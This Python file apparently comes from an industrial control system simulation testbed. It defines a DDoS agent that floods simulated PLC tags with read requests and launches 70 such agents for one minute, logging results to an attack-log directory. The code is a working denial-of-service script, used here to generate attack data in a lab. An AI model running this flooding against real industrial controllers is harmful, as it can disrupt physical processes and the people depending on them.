import logging
import os
import random
import sys
from datetime import datetime
from time import sleep

from ics_sim.Device import HMI
from Configs import TAG, Controllers


class DDosAgent(HMI):
    max = 0

    def __init__(self, name, is_first):
        self.is_first = is_first
        super().__init__(name, TAG.TAG_LIST, Controllers.PLCs, 1)
        self.__counter = 0
        self.__target = random.choice(list(TAG.TAG_LIST.keys()))


    def _before_start(self):
        self._set_clear_scr(False)

    def _logic(self):
        try:
            for i in range(10):
                value = self._receive(self.__target)
            self.__counter += 10

        except Exception as e:
            self.report('get exception on read request {}'.format(self.name(), self.__counter), logging.INFO)

    def _post_logic_update(self):
        latency = self.get_logic_execution_time()
        if latency > DDosAgent.max:
            DDosAgent.max = latency
            self.report('Max seen latency reached to {}'.format(DDosAgent.max), logging.INFO)
        if self.__counter % 1000 == 0:
            self.report('sent {} read request for {}'.format(self.name(), self.__counter, self.__target), logging.INFO)

    def _initialize_logger(self):
        if self.is_first:
            self._logger = self.setup_logger(
                "log-ddos",
                logging.Formatter('%(asctime)s %(levelname)s %(message)s'),
                file_dir= "./attacks/attack-logs",
                file_ext='.txt',
                write_mode='a',
                level=logging.INFO
            )
        else:
            self._logger = logging.getLogger('log-ddos')

    def _before_stop(self):
        self.report("sent {} massages before stop".format(self.__counter))


if __name__ == '__main__':
    name_prefix = ''
    if len(sys.argv) > 0:
        name_prefix = sys.argv[1]

    attackers_count = 70
    attacker_list = []
    for i in range(attackers_count):
        attacker_list.append(DDosAgent('DDoS1_Agent_' + name_prefix + str(i), i==0))

    for attacker in attacker_list:
        attacker.start()

    sleep(60)

    for attacker in attacker_list:
        attacker.stop()



